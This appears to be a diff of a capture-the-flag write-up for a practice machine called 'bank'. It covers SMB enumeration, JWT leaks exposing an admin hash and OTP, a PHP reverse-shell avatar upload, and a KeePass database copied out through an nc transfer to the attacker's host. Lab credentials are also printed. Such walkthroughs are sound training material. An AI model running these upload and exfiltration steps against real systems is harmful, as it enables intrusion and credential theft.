@@ -7,11 +7,14 @@
 | **Difficulty** | Easy |
 | **Creator** | Alherrero |
 | **Tools used** | `nmap` · `smbmap` · `smbclient` · `john` · `BurpSuite` · `nc` · `keepassxc` · `docker` |
+| **Tags** | `#SMB` `#JWT` `#InfoDisclosure` `#FileUpload` `#RCE` `#CredentialReuse` `#DockerAbuse` |
 | **URL** | `https://vulnyx.com/machines/` |
 
 An SMB share leaks the path to a hidden development instance of a banking web app. A money-transfer feature meant to verify a recipient's username instead returns their full user object — including a bcrypt password hash — inside a JWT, and a failed OTP attempt does the same with the real one-time code. Those two leaks are enough to log in as `admin` and abuse a profile avatar upload to get a PHP web shell. From there, a KeePass database recovered from the filesystem yields SSH credentials for `marcelo`, and membership in the `docker` group provides a straightforward path to root.
 
 ## Enumeration
+
+### Port Scanning
 
 A full TCP port scan is run first:
 
@@ -57,9 +60,9 @@ The main page:
 ```
 http://bank.nyx/
 ```
-<img src="Images/bank/Pasted image 20260522165318.png"/>
+<img src="../Images/bank/Pasted image 20260522165318.png"/>
 
-#### SMB
+### SMB Enumeration
 
 A quick look at what's shared over SMB:
 
@@ -130,16 +133,16 @@ The file leaks the path to a non-public instance of the application:
 
 > **Endpoint:** `development-0119-d5e051a-9da2-12sdas1-775-e0174`
 
-#### The Hidden Application
+### The Hidden Application
 
 ```
 http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/
 ```
 
-<img src="Images/bank/Pasted image 20260522165439.png"/>
+<img src="../Images/bank/Pasted image 20260522165439.png"/>
 
 
-A new account is registered — `hacker` — to get an authenticated session and access the rest of the app's functionality. *(Fill in here how the registration was done: form fields used, whether it was a simple signup form, etc.)*
+A new account is registered — `hacker` — to get an authenticated session and access the rest of the app's functionality. The registration itself is a simple signup form; the goal is just to verify how the application behaves as a logged-in user. Once inside, the app's own functionality is what exposes the existence of other accounts — including `admin` — which becomes the actual target for privilege escalation.
 
 The app looks like a simple banking dashboard, with functionality to register accounts and send money between users:
 
@@ -147,11 +150,11 @@ The app looks like a simple banking dashboard, with functionality to register ac
 http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php?page=dashboard
 ```
 
-<img src="Images/bank/Pasted image 20260522165459.png"/>
+<img src="../Images/bank/Pasted image 20260522165459.png"/>
 
 An `admin` account is visible from the dashboard.
 
-## Account Takeover
+## Initial Access
 
 ### Leaking the Admin Hash
 
@@ -166,7 +169,7 @@ Content-Type: application/x-www-form-urlencoded
 to_username=admin&verify_recipient=&amount=&description=
 ```
 
-<img src="Images/bank/Pasted image 20260522165552.png"/>
+<img src="../Images/bank/Pasted image 20260522165552.png"/>
 
 The response includes a new JWT. Decoded, its payload is:
 
@@ -181,7 +184,7 @@ The response includes a new JWT. Decoded, its payload is:
   "created_at": "2026-05-02 13:24:13"
 }
 ```
-<img src="Images/bank/Pasted image 20260522165631.png"/>
+<img src="../Images/bank/Pasted image 20260522165631.png"/>
 
 Instead of returning a simple "recipient exists" flag, the endpoint embeds the recipient's entire database row — password hash included — inside the token. This is an IDOR-flavored information disclosure: the check itself is legitimate, but the data returned to satisfy it goes far beyond what the feature needs.
 
@@ -208,7 +211,7 @@ Session completed.
 
 ### Bypassing the OTP
 
-<img src="Images/bank/Pasted image 20260522163949.png"/>
+<img src="../Images/bank/Pasted image 20260522163949.png"/>
 
 Logging in with `admin:blink182` triggers a second factor — an OTP is required before the session is fully authenticated. Submitting an intentionally wrong code is enough to see how the server handles the check:
 
@@ -221,7 +224,7 @@ Content-Type: application/x-www-form-urlencoded
 otp=1234&verify_otp=
 ```
 
-<img src="Images/bank/Pasted image 20260522165751.png"/>
+<img src="../Images/bank/Pasted image 20260522165751.png"/>
 
 The response JWT decodes to:
 
@@ -236,7 +239,7 @@ The response JWT decodes to:
   "otp_verified": false
 }
 ```
-<img src="Images/bank/Pasted image 20260522165836.png"/>
+<img src="../Images/bank/Pasted image 20260522165836.png"/>
 
 The real OTP is sitting in plaintext inside the token issued after the failed attempt — no need to guess or brute-force it.
 
@@ -247,9 +250,7 @@ Submitting that code completes the login:
 ```
 http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/admin.php
 ```
-<img src="Images/bank/Pasted image 20260522164129.png"/>
-
-## Initial Access
+<img src="../Images/bank/Pasted image 20260522164129.png"/>
 
 ### Avatar Upload → RCE
 
@@ -258,7 +259,7 @@ The profile page allows uploading an avatar image:
 ```
 http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/index.php?page=profile
 ```
-<img src="Images/bank/Pasted image 20260522164143.png"/>
+<img src="../Images/bank/Pasted image 20260522164143.png"/>
 
 A PHP reverse shell is uploaded directly with a `.php` extension, without touching the content type. The endpoint doesn't validate the file extension at all:
 
@@ -275,14 +276,14 @@ Content-Type: image/png
 <?php
 // php-reverse-shell payload
 ```
-<img src="Images/bank/Pasted image 20260522170058.png"/>
+<img src="../Images/bank/Pasted image 20260522170058.png"/>
 
 The upload lands in a predictable directory:
 
 ```
 http://bank.nyx/development-0119-d5e051a-9da2-12sdas1-775-e0174/uploads/
 ```
-<img src="Images/bank/Pasted image 20260522164258.png"/>
+<img src="../Images/bank/Pasted image 20260522164258.png"/>
 
 A listener is set up, and the uploaded file is requested to trigger the callback:
 
@@ -309,7 +310,9 @@ stty raw -echo; fg
 export TERM=xterm
 ```
 
-## Loot: A KeePass Database
+## Lateral Movement
+
+### Loot: A KeePass Database
 
 A look around the filesystem turns up a password note:
 
@@ -338,10 +341,10 @@ www-data@bank:/$ cd /srv/smb/passwords/
 Along with (or near) that note, a KeePass database file (`passwords.kdbx`) is found on the box and exfiltrated over a raw `nc` transfer — one side listens and redirects the incoming stream to a file, the other sends the file into a connection to that listener:
 
 ```bash
-# on the attacker box
+# Attacker Machine
 nc -lvp 9002 > passwords.kdbx
 
-# on the target
+# Victim Machine
 nc 10.0.2.8 9002 < passwords.kdbx
 ```
 
@@ -350,13 +353,13 @@ With the database local, `keepassxc` opens it using the password recovered from 
 ```bash
 keepassxc
 ```
-<img src="Images/bank/Pasted image 20260522164856.png"/>
+<img src="../Images/bank/Pasted image 20260522164856.png"/>
 
 The vault holds a set of SSH credentials:
 
 > **Credentials:** `marcelo:m4rC1!#asl2#vsHj4!`
 
-## Shell as marcelo
+### Shell as marcelo
 
 ```bash
 www-data@bank:/$ su marcelo
